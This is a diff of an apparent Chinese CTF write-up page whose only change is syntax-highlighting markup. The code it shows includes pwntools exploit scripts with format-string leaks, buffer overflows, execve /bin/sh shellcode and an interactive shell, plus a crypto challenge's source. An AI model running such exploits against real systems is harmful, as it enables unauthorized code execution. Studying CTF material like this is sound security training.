@@ -546,10 +546,10 @@ xor     ax, 101h
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
 <span class="c1">#elf = ELF(ELF_PATH)
 #libc = ELF(LIBC_PATH)
 </span>
@@ -558,10 +558,10 @@ xor     ax, 101h
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90</span><span class="s">"</span> 
-    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name: </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name: </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <h2 id="pwn3d2">PWN3D2</h2>
@@ -602,10 +602,10 @@ xor     ax, 101h
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
 <span class="c1">#elf = ELF(ELF_PATH)
 #libc = ELF(LIBC_PATH)
 </span>
@@ -613,7 +613,7 @@ xor     ax, 101h
 <span class="c1">#r = process("./pwn2")
 </span><span class="n">shellcode_byte</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span> <span class="p">]</span>
 
-<span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">)</span>
 
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -621,21 +621,21 @@ xor     ax, 101h
 	<span class="n">echo_start</span> <span class="o">=</span> <span class="mh">0x08048540</span>
 
 	<span class="c1"># leak ebp
-</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">p."</span><span class="o">*</span><span class="mi">3</span>
-	<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"%p."</span><span class="o">*</span><span class="mi">3</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
 	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">echo_start</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 	
 	<span class="c1"># calculate buffer address
-</span>	<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+</span>	<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
 	<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mi">28</span>
 
 	<span class="c1"># return to shellcode
 </span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">20</span>
 	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
 	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -679,10 +679,10 @@ exit 則是離開程式</p>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
 <span class="c1">#elf = ELF(ELF_PATH)
 #libc = ELF(LIBC_PATH)
 </span>
@@ -694,7 +694,7 @@ exit 則是離開程式</p>
 <span class="c1"># constructing shellcode data
 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x90</span><span class="p">]</span> <span class="o">*</span> <span class="mi">9</span>
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">:</span>
-	<span class="n">shellcode</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+	<span class="n">shellcode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="p">[]</span>
 <span class="n">cur</span> <span class="o">=</span> <span class="mi">0</span>
@@ -702,20 +702,20 @@ exit 則是離開程式</p>
 	<span class="n">now</span> <span class="o">=</span> <span class="n">index</span> <span class="o">%</span> <span class="mi">4</span>
 	<span class="n">cur</span> <span class="o">|=</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">now</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
 	<span class="k">if</span> <span class="n">now</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
-		<span class="n">payload</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">cur</span><span class="p">))</span>	
+		<span class="n">payload</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">cur</span><span class="p">))</span>	
 		<span class="n">cur</span> <span class="o">=</span> <span class="mi">0</span>
 
 <span class="k">def</span> <span class="nf">pop</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Top item is: "</span><span class="p">)</span>
-	<span class="n">item</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-	<span class="n">n</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Top item is: "</span><span class="p">)</span>
+	<span class="n">item</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">n</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
 	<span class="k">return</span> <span class="n">n</span>
 
 <span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"number:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"number:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
@@ -723,48 +723,48 @@ exit 則是離開程式</p>
 
 	<span class="c1"># leaking ebp
 </span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
-		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-		<span class="n">temp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pop</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+		<span class="n">temp</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">pop</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
 	
 	<span class="c1"># calculate buffer address &amp; address for ecx
-</span>	<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>
-	<span class="n">ecx_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"buffer address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ecx address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ecx_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
+</span>	<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>
+	<span class="n">ecx_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"buffer address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ecx address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ecx_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
 
 	<span class="c1"># restore stack
 </span>	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">temp</span><span class="p">):</span>
-		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
 
 	<span class="c1"># shellcode
 </span>	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
-		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
 
 	<span class="c1"># padding
 </span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">23</span><span class="p">):</span>
-		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 
 	<span class="c1"># important address for ecx
-</span>	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+</span>	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 	<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">ecx_addr</span><span class="p">)</span>
 
 	<span class="c1"># padding
 </span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="mi">29</span><span class="p">):</span>
-		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 
 	<span class="c1"># return address
-</span>	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+</span>	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 	<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>
 
 	<span class="c1"># invoke BOF
-</span>	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+</span>	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
 
-	<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -818,10 +818,10 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 
 <span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
 	<span class="k">global</span> <span class="n">KEY</span>
-	<span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">KEY</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+	<span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">KEY</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">get_number</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
-	<span class="n">num</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">num</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="n">msg</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
 	<span class="k">try</span><span class="p">:</span>
 		<span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
 	<span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
@@ -830,19 +830,19 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 	<span class="k">return</span> <span class="n">num</span>
 
 <span class="k">def</span> <span class="nf">pick_orange</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-	<span class="n">data</span> <span class="o">=</span> <span class="s">'num=</span><span class="si">%</span><span class="s">d&amp;price=10'</span> <span class="o">%</span> <span class="n">num</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="s">'num=%d&amp;price=10'</span> <span class="o">%</span> <span class="n">num</span>
 	<span class="k">print</span> <span class="s">'OK, this is your order information. You can check out with this code'</span>
-	<span class="k">print</span> <span class="s">'</span><span class="si">%</span><span class="s">s-----</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="k">print</span> <span class="s">'%s-----%s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">check_out</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">MONEY</span>
-	<span class="n">s</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Input your order information: '</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">s</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Input your order information: '</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
 	<span class="k">if</span> <span class="s">'-----'</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
-		<span class="n">data</span><span class="p">,</span> <span class="n">hmac</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-----'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+		<span class="n">data</span><span class="p">,</span> <span class="n">hmac</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-----'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 		<span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="n">hmac</span><span class="p">:</span>
 			<span class="n">info</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span> <span class="n">parse_qsl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
-			<span class="n">num</span>   <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'num'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-			<span class="n">price</span> <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'price'</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+			<span class="n">num</span>   <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'num'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+			<span class="n">price</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'price'</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
 
 			<span class="k">try</span><span class="p">:</span>
 				<span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
@@ -852,8 +852,8 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 				<span class="n">price</span> <span class="o">=</span> <span class="mi">10</span>
 
 			<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">price</span><span class="p">,</span> <span class="nb">int</span><span class="p">):</span>
-				<span class="k">print</span> <span class="s">'You buy </span><span class="si">%</span><span class="s">d oranges'</span> <span class="o">%</span> <span class="n">num</span>
-				<span class="k">print</span> <span class="s">'Per price of orange is $</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">price</span>
+				<span class="k">print</span> <span class="s">'You buy %d oranges'</span> <span class="o">%</span> <span class="n">num</span>
+				<span class="k">print</span> <span class="s">'Per price of orange is $%d'</span> <span class="o">%</span> <span class="n">price</span>
 
 				<span class="k">if</span> <span class="n">num</span> <span class="o">*</span> <span class="n">price</span> <span class="o">&gt;</span> <span class="n">MONEY</span><span class="p">:</span>
 					<span class="k">print</span> <span class="s">'You are too poor'</span>
@@ -870,14 +870,14 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 <span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">MONEY</span><span class="p">,</span> <span class="n">FLAG</span>
 	<span class="k">if</span> <span class="n">MONEY</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">:</span>
-		<span class="k">print</span> <span class="s">'Cong, the flag is </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">FLAG</span>
+		<span class="k">print</span> <span class="s">'Cong, the flag is %s'</span> <span class="o">%</span> <span class="n">FLAG</span>
 		<span class="nb">exit</span><span class="p">()</span>
 	<span class="k">else</span><span class="p">:</span>
 		<span class="k">print</span> <span class="s">'Oh no, you are too poor'</span>
 
 <span class="k">def</span> <span class="nf">show_money</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">MONEY</span>
-	<span class="k">print</span> <span class="s">'You now have $</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">MONEY</span>
+	<span class="k">print</span> <span class="s">'You now have $%d'</span> <span class="o">%</span> <span class="n">MONEY</span>
 
 <span class="k">def</span> <span class="nf">motd</span><span class="p">():</span>
 	<span class="k">print</span> <span class="s">'''
@@ -913,12 +913,12 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 
 <span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
 	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/dev/urandom'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
